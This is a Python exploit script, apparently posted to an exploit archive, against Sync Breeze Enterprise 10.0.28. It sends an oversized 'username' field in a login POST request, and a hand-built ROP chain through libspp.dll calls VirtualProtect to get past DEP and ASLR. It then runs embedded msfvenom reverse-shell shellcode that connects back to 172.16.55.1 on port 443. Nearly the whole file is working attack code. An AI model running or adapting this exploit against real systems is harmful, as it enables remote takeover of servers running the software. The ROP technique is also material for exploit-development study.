# Sync Breeze Enterprise 10.0.28 Remote Memory Corruption (DEP/ASLR bypass)
# kernel32!VirtualProtect
# Author: Connor McGarr (@33y0re)
# https://connormcgarr.github.io
# ROP'd this badboy by hand- sorry mona.
# In muts we trust.

import socket
import time
import sys
import struct

# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.55.1 LPORT=443 -b "\x0\x0a\x0d\x25\x26\x2b\x3d" -f python -v shellcode
shellcode = ""
shellcode += "\xdb\xc9\xb8\x3e\xbf\x99\xa4\xd9\x74\x24\xf4"
shellcode += "\x5a\x33\xc9\xb1\x52\x83\xea\xfc\x31\x42\x13"
shellcode += "\x03\x7c\xac\x7b\x51\x7c\x3a\xf9\x9a\x7c\xbb"
shellcode += "\x9e\x13\x99\x8a\x9e\x40\xea\xbd\x2e\x02\xbe"
shellcode += "\x31\xc4\x46\x2a\xc1\xa8\x4e\x5d\x62\x06\xa9"
shellcode += "\x50\x73\x3b\x89\xf3\xf7\x46\xde\xd3\xc6\x88"
shellcode += "\x13\x12\x0e\xf4\xde\x46\xc7\x72\x4c\x76\x6c"
shellcode += "\xce\x4d\xfd\x3e\xde\xd5\xe2\xf7\xe1\xf4\xb5"
shellcode += "\x8c\xbb\xd6\x34\x40\xb0\x5e\x2e\x85\xfd\x29"
shellcode += "\xc5\x7d\x89\xab\x0f\x4c\x72\x07\x6e\x60\x81"
shellcode += "\x59\xb7\x47\x7a\x2c\xc1\xbb\x07\x37\x16\xc1"
shellcode += "\xd3\xb2\x8c\x61\x97\x65\x68\x93\x74\xf3\xfb"
shellcode += "\x9f\x31\x77\xa3\x83\xc4\x54\xd8\xb8\x4d\x5b"
shellcode += "\x0e\x49\x15\x78\x8a\x11\xcd\xe1\x8b\xff\xa0"
shellcode += "\x1e\xcb\x5f\x1c\xbb\x80\x72\x49\xb6\xcb\x1a"
shellcode += "\xbe\xfb\xf3\xda\xa8\x8c\x80\xe8\x77\x27\x0e"
shellcode += "\x41\xff\xe1\xc9\xa6\x2a\x55\x45\x59\xd5\xa6"
shellcode += "\x4c\x9e\x81\xf6\xe6\x37\xaa\x9c\xf6\xb8\x7f"
shellcode += "\x32\xa6\x16\xd0\xf3\x16\xd7\x80\x9b\x7c\xd8"
shellcode += "\xff\xbc\x7f\x32\x68\x56\x7a\xd5\x3b\xb7\xb3"
shellcode += "\x24\x2c\xba\xbb\x27\x17\x33\x5d\x4d\x77\x12"
shellcode += "\xf6\xfa\xee\x3f\x8c\x9b\xef\x95\xe9\x9c\x64"
shellcode += "\x1a\x0e\x52\x8d\x57\x1c\x03\x7d\x22\x7e\x82"
shellcode += "\x82\x98\x16\x48\x10\x47\xe6\x07\x09\xd0\xb1"
shellcode += "\x40\xff\x29\x57\x7d\xa6\x83\x45\x7c\x3e\xeb"
shellcode += "\xcd\x5b\x83\xf2\xcc\x2e\xbf\xd0\xde\xf6\x40"
shellcode += "\x5d\x8a\xa6\x16\x0b\x64\x01\xc1\xfd\xde\xdb"
shellcode += "\xbe\x57\xb6\x9a\x8c\x67\xc0\xa2\xd8\x11\x2c"
shellcode += "\x12\xb5\x67\x53\x9b\x51\x60\x2c\xc1\xc1\x8f"
shellcode += "\xe7\x41\xf1\xc5\xa5\xe0\x9a\x83\x3c\xb1\xc6"
shellcode += "\x33\xeb\xf6\xfe\xb7\x19\x87\x04\xa7\x68\x82"
shellcode += "\x41\x6f\x81\xfe\xda\x1a\xa5\xad\xdb\x0e"

crash = "\x41" * 780
crash += struct.pack('<L', 0x100b9c5c)                # ret: libspp.dll (non-ASLR based module)

# 4 byte pad to compensate for distance between EIP and ESP
crash += "\x42\x42\x42\x42"

# kernel32!VirtualProtect()
# EDI -> (ROP NOP)
# ESI -> VirtualProtect()
# EBP -> Return address (where to jump after execution)
# ESP -> lpAddress (Staring address for permissions change. Filled dynamically with current ESP value)
# EBX -> dwSize (~size of shellcode)
# EDX -> flNewProtect (desired memory page permissions...)
# ECX -> lpflOldProtect (inherits old permissions- any writeable address)
# EAX -> NOP

# 10168074  76d28f9a kernel32!GetDriveTypeAStub
# kernel32!VirtualProtect = kernel32!GetDriveTypeAStub - 0x36ec2

# Begin ROP chain. In muts we trust.
print "[+] Stack pivot done! Starting ROP chain. Wish us luck..."

# Return Address (shellcode is futher down the stack) into EBP
print "[+} Placing return address into EBP"
crash += struct.pack('<L', 0x10109b8e)				  # pop ebx ; ret: libspp.dll (non-ASLR based module) (Preparing COP gadget)
crash += struct.pack('<L', 0x10116ba2)				  # add esp, 0x04 ; ret: libspp.dll (non-ASLR based module) (Returning to the stack after COP gadget)
crash += struct.pack('<L', 0x101291b1)			      # pop edx ; sub al, 0x5B ; ret: libspp.dll (non-ASLR based module) (Return to stack will land right above the pushed EDX value from the COP gadget. Loading EDX with POP EBP pointer to load pushed ESP value into EBP)
crash += struct.pack('<L', 0x101090ba)				  # pop ebp ; ret: libspp.dll (non-ASLR based module) (Pops ESP into EBP via below gadget)
crash += struct.pack('<L', 0x10125c3c)				  # push esp ; xor edi, edi ; push edx ; call ebx: libspp.dll (non-ASLR based module)
crash += struct.pack('<L', 0x1012b413)				  # pop eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffffe2c)				  # Shellcode is about negative fffffe2c bytes down the stack
crash += struct.pack('<L', 0x10104df6)			      # neg eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1014426e)				  # xchg eax, ebp ; ret: libspp.dll (non-ASLR based module) (Placing EBP temporarily into EAX for calculations because EBP directly couldn't be manipulated to equal the shellcode lcoation)
crash += struct.pack('<L', 0x100fcd71)				  # add eax, ebp ; dec ecx ; ret: libspp.dll (non-ASLR enabled module) (Intended EBP value is now in EAX)
crash += struct.pack('<L', 0x1014426e)				  # xchg eax, ebp ; ret: libspp.dll (non-ASLR based module) (Placing intended value from EAX into EBP where it belongs)

# dwSize into EBX
print "[+] Placing dwSize into EBX"
crash += struct.pack('<L', 0x1013aa81)				  # pop ebx ; ret: libspp.dll (non-ASLR enabled module) (Popping a pop EBX gadget into EBX so when COP gadget is done executing, it pops the pushed value of EAX from the below COP gadget into EBX. EAX currently still contains 0xc8, whiich is close to the shellcode size)
crash += struct.pack('<L', 0x101582b0)				  # pop eax ; pop ebx ; ret: libspp.dll (non-ASLR enabled module) (Popping pushed EAX value into EBX. Need to first pop the CALL's return address into EAX)
crash += struct.pack('<L', 0x1013403a)				  # push eax ; call ebx: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1012b413)				  # pop eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffffec8)				  # 0x138 = 312 decimal (0xfffffec8 = negative 0x138 and 0x10C, the current value of ebx, + 0x138 = 0x30C, or 780 decimal)
crash += struct.pack('<L', 0x10104df6)			      # neg eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100c9be1)				  # add ebx, eax ; mov eax, 0x00000001 ; ret: libspp.dll (non-ASLE enabled module)

# kernel32!VirtualProtect address into ESI
print "[+] Extracting kernel32!VirtualProtect from IAT entry"
crash += struct.pack('<L', 0x100b9c5c)                # ret: libspp.dll (non-ASLR based module) (ROP NOP)
crash += struct.pack('<L', 0x1012b413)				  # pop eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1016806C)				  # ptr to kernel32!GetDriveTypeAStub - 8 (Gadget that extracts this pointer does so at an offset of 8, so compensating)
crash += struct.pack('<L', 0x1014dcdf)				  # mov eax, dword [eax+0x8] ; ret: libspp.dll (non-ASLR enabled module) (Extracting pointer into EAX)
crash += struct.pack('<L', 0x101291b1)			      # pop edx ; sub al, 0x5B ; ret: libspp.dll (non-ASLR based module)
crash += struct.pack('<L', 0xfffc9199)				  # kernel32!VirtualProtect is negative fffc9199 bytes away from kernel32!GetDriveTypeAStub
crash += struct.pack('<L', 0x1003f9f9)				  # add eax, edx ; ret 0x004: libspp.dll (non-ASLR enabled module) (Storing kernel32!VirtualProtect in EAX)
crash += struct.pack('<L', 0x1003f2d8)				  # push eax ; mov eax, 0x00000001 ; pop esi ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)				  # Compensation for ret 0x004 in previous ROP gadget

# flNewProtect into EDX
print "[+] Placing flNewProtect into EDX"
crash += struct.pack('<L', 0x1013ac5c)				  # xor edx, edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100bb1f4)				  # inc edx ; ret: libspp.dll (non-ASLR enabled module)

# lpflOldProtect into ECX
print "[+] Placing lpflOldProtect into ECX"
crash += struct.pack('<L', 0x10165c79)				  # pop ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1020c730)				  # Writeable address in .data section of libspp.dll

# ROP NOP into EDI
crash += struct.pack('<L', 0x1012e6de)				  # pop edi ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100b9c5c)                # ret: libspp.dll (non-ASLR based module)

# NOPs into EAX
crash += struct.pack('<L', 0x1012b413)				  # pop eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)				  # NOPs

# PUSHAD
print "[+] Pushing all kernel32!VirtualProtect parameters to the stack. Hold on to your horses!"
crash += struct.pack('<L', 0x1014fb08)				  # pushad ; ret: libspp.dll (non-ASLR enabled module)

# NOP sled
crash += "\x90" * 100

crash += shellcode

crash += "\x43" * (1500-len(crash))

fuzz="username="+crash+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 172.16.55.128\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://172.16.55.128/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(fuzz))+"\r\n"
buffer+="\r\n"
buffer+=fuzz
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.128", 80))
s.send(buffer)

print "[+] Exploit sent! Check for a shell on port 443!"

s.close()
